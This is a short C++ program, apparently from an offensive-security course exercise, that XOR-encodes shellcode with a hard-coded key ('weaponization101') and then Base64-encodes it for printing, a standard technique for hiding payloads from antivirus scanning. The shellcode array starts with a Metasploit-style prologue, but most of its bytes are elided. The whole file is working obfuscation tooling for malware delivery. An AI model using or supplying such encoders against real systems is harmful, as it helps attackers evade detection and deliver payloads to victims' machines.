#include <iostream>
#include <string>
#include <vector>
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "Crypt32.lib")

// XOR encryption function
std::vector<unsigned char> xorEncode(const std::vector<unsigned char>& shellcode, const std::string& key) {
    std::vector<unsigned char> encoded(shellcode.size());
    for (size_t i = 0; i < shellcode.size(); ++i) {
        encoded[i] = shellcode[i] ^ key[i % key.size()];
    }
    return encoded;
}

// Base64 encoding function
std::string base64Encode(const std::vector<unsigned char>& data) {
    DWORD encodedSize = 0;
    CryptBinaryToStringA(data.data(), data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedSize);

    std::string encodedStr(encodedSize, '\0');
    CryptBinaryToStringA(data.data(), data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &encodedStr[0], &encodedSize);

    return encodedStr;
}

int main() {
    // Key for XOR
    std::string key = "weaponization101";

    // The shellcode you want to encode
    std::vector<unsigned char> shellcode = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00,
    ...., ...., ...., ...., ...., ...., ...., 0x41,
    0x89, 0xda, 0xff, 0xd5 };
   

    // Encode with XOR
    std::vector<unsigned char> xorEncoded = xorEncode(shellcode, key);

    // Encode result of XOR to Base64
    std::string base64Encoded = base64Encode(xorEncoded);

    // Print Base64 encoded shellcode
    std::cout << "Base64 Encoded Shellcode: " << base64Encoded << std::endl;

    return 0;
}
